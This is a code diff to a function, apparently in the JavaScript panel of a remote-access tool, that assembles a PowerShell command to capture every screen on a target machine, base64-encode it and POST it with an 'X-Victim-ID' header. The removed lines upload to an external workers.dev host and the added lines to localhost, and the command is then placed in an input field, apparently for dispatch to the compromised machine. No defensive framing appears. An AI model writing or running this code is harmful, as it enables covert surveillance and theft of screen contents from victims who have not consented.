@@ -939,19 +939,30 @@ function takeScreenshot(id) {
         '$screens = [Windows.Forms.Screen]::AllScreens\n' +
         '$top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum\n' +
         '$left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum\n' +
-        '$width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum\n' +
-        '$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n' +
-        '$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)\n' +
-        '$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height\n' +
+        '$right = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum\n' +
+        '$bottom = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\n' +
+        '$bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)\n' +
+        '$bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height\n' +
         '$graphics = [Drawing.Graphics]::FromImage($bmp)\n' +
-        '$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n' +
+        '$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)\n' +
         '$ms = New-Object IO.MemoryStream\n' +
         '$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)\n' +
-        '$b64 = [Convert]::ToBase64String($ms.ToArray())\n' +
+        '$b64 = [Convert]::ToBase64String($ms.ToArray()).Trim()\n' +
         '$graphics.Dispose()\n' +
-        '$bmp.Dispose()\n' + 
-        'Invoke-RestMethod -Uri "https://readme.sharansahu1604.workers.dev/upload" -Method POST -Headers @{"X-Victim-ID"="$env:COMPUTERNAME";"X-Filename"="screenshot.png";"X-Data-Type"="screenshot"} -Body "data:image/png;base64,$b64"
-        `.trim()';
+        '$bmp.Dispose()\n' +
+        'Invoke-RestMethod ' +
+        '-Uri "http://localhost:8080/upload" ' +
+        '-Method POST ' +
+        '-Headers @{ ' +
+            '"X-Victim-ID" = $env:COMPUTERNAME; ' +
+            '"X-Filename" = "screenshot.png"; ' +
+            '"X-Data-Type" = "screenshot" ' +
+        '} ' +
+        '-Body ("data:image/png;base64," + $b64)\n';
+
+    return cmd;
+}
+
 
             const input = document.getElementById('cmd_' + id);
             input.value = cmd;
